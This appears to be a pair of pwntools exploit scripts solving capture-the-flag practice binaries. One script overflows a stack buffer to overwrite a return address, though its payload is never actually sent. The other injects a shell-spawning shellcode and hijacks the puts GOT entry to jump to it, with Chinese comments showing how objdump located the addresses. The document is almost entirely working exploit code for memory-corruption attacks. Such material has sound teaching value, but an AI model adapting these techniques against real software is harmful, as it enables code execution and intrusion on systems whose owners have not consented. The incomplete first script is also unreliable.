exp

# pwn_01_bof.c

```python
from pwn import *
r = process('./bof')

r.recvuntil(')')

p= 'a'*0x18 + p64(0x400607)

r.interactive()
```

# pwn_04_gothijack.c

```python
from pwn import *
r = process('./gothijack')

r.recvuntil('?\n')
context.arch = 'amd64'

sc = asm(shellcraft.sh())

r.send(sc)

r.recvuntil('?\n')

# objdump -d gothijack   查看put的got
# 去puts@plt 看got 最后面看到的 0x601018
# 4005d0<putsplt>: 4005d0:    ff 25 42 0a 20 00   jmp QWORD PTR [rip+0x200a42]    # 601018<puts@GLIBC_2.
r.sendline(str(0x601018))  # puts@GOT

r.recvuntil(':')
# objdump 看 name 的地址
# 40077b: lea   rsi,[rip+0x2008fe]     # 601080 <name>
r.send(p64(0x601080)) # name (address of shellcode)
```